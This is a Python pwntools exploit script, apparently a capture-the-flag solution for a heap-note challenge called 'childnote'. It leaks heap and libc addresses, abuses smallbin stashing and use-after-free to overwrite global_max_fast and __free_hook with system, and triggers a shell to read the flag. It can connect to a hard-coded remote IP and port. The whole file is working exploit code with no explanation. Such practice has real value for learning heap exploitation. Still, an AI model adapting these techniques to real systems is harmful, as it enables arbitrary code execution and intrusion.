#!/usr/bin/python3

from pwn import *
import sys

BIN = './childnote'

if len(sys.argv) > 1:
    r = remote( '140.112.31.97', 30204 )
    #context.log_level = 'debug'
else:
    r = process( BIN )

def add(size, data): # 0x80~0x100
    r.sendafter("Choice >", '1')
    r.sendafter("size : ", str(size))
    r.sendafter("Content : ", data)

def edit(idx, data):
    r.sendafter("Choice >", '3')
    r.sendafter("index : ", str(idx))
    r.sendafter("Content : ", data)

def delete(idx):
    r.sendafter("Choice >", '4')
    r.sendafter("index : ", str(idx))

def show(idx):
    r.sendafter("Choice >", '2')
    r.sendafter("index : ", str(idx))
    address = u64(r.recvline()[:-1]+b'\x00\x00')
    
    return address

for i in range(0x9): # 0~8
    add(0x90, p64(0x100)*0x10)

for i in range(8, 1, -1):
    delete(i)

add(0xb0, 'A') # 9
delete(9)

heap = show(3) & 0xfffffffff000
log.info(f"heap: {hex(heap)}")
delete(0)
delete(1)
libc_addr = show(0) - 0x1ebbe0 # main_arena + 96
global_max_fast = libc_addr + 0x1eeb80
system_addr = libc_addr + 0x55410
free_hook = libc_addr + 0x1eeb28
log.info(f"libc_addr: {hex(libc_addr)}")
log.info(f"global_max_fast: {hex(global_max_fast)}")
log.info(f"system_addr: {hex(system_addr)}")
log.info(f"free_hook: {hex(free_hook)}")

##### chunk overlap
add(0xf0, 'Q') # 10
fchk2 = b'Q'*0x88 + p64(0) + p64(0x110) + p64(0x100) + p64(0xAAAABBBBCCCCDDDD)
for i in range(7):
    edit(10, fchk2)
    delete(1)

fchk = b'Q'*0x88 + p64(0) + p64(0x100) + p64(0x100) + p64(0xAAAABBBBCCCCDDDD)
for i in range(6):
    edit(10, fchk)
    delete(1)

##### smallbin stashing
edit(10, fchk)
edit(1, b'Q'*0x48 + p64(0) + p64(0x101) + p64(libc_addr + 0x1ebbe0)*2)
add(0x100, p64(0x100)*0x1f) # 11, large chunk to smallbin

edit(1, b'Q'*0x48 + p64(0) + p64(0x101) + p64(libc_addr + 0x1ebbe0) + p64(heap + 0x2b0))
edit(10, b'Q'*0x8 + p64(0) + p64(0x101) + p64(heap + 0x390) + p64(global_max_fast - 0x10))
add(0xf0, p64(0x100)*0x1d) # 12

##### write allocate 0x80 into fastbin
edit(10, fchk2)
edit(1, p64(0x110)*0x12)
delete(1)

##### UAF
edit(10, b'Q'*0x88 + p64(0) + p64(0x100) + p64(0)*2)
delete(1)
edit(10, b'Q'*0x88 + p64(0) + p64(0x100) + p64(heap + 0x1b))
add(0xf0, p64(0x100)*0x1f) # 13
add(0xf0, b'\x00'*0xd5 + p64(system_addr)) # 14

##### write free_hook
fchk2 = b'Q'*0x88 + p64(0) + p64(0x200) + p64(0x100) + p64(0xAAAABBBBCCCCDDDD)
edit(10, fchk)
edit(1, p64(0x110)*0x40)
edit(10, b'Q'*0x88 + p64(0) + p64(0x110) + p64(free_hook - 0x10))
add(0x100, 'Q') # 15

##### get shell
edit(10, b'Q'*0x88 + p64(0) + p64(0x100) + b'/bin/sh\x00')
delete(1)

r.sendline('cat /home/`whoami`/flag')
r.interactive()
